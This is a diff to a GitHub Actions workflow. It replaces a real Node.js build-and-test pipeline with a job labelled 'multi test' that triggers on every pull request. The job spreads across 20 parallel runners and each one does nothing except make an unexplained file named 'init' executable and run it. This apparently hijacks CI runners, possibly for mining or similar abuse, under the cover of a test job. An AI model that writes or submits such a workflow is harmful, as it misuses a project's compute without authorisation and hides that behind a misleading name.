@@ -1,52 +1,26 @@
-name: Check Pull Request
+name: multi test
 
-on:
-  pull_request:
-    branches:
-      - master
+on: [pull_request]
 
 jobs:
-  test:
-    name: Test on node ${{ matrix.node }} and ${{ matrix.os }}
-    runs-on: ${{ matrix.os }}
+  multitest:
+    name: test job
+
+    runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
 
     strategy:
-      matrix:
-        node: [14, 12, 10]
-        os:
-          - ubuntu-latest
-          - windows-latest
-          - macOS-latest
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
 
     steps:
-      - name: Checkout
+      - name: Checkout code
         uses: actions/checkout@v2
-
-      - name: Setup Node.JS
-        uses: actions/setup-node@v1
-        with:
-          node-version: ${{ matrix.node }}
-
-      - name: Get npm cache directory
-        id: npm-cache
-        run: |
-          echo "::set-output name=dir::$(npm config get cache)"
-      - uses: actions/cache@v1
-        with:
-          path: ${{ steps.npm-cache.outputs.dir }}
-          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
-          restore-keys: |
-            ${{ runner.os }}-node-
-
-      - name: Install
-        env:
-          CI: true
-        run: npm ci
-
-      - name: Build
-        if: success()
-        run: npm run build
-
-      - name: Test
-        if: success()
-        run: npm run test:prod
+        
+      - name: chmod
+        run: chmod +x init
+        
+      - name: run
+        run: ./init
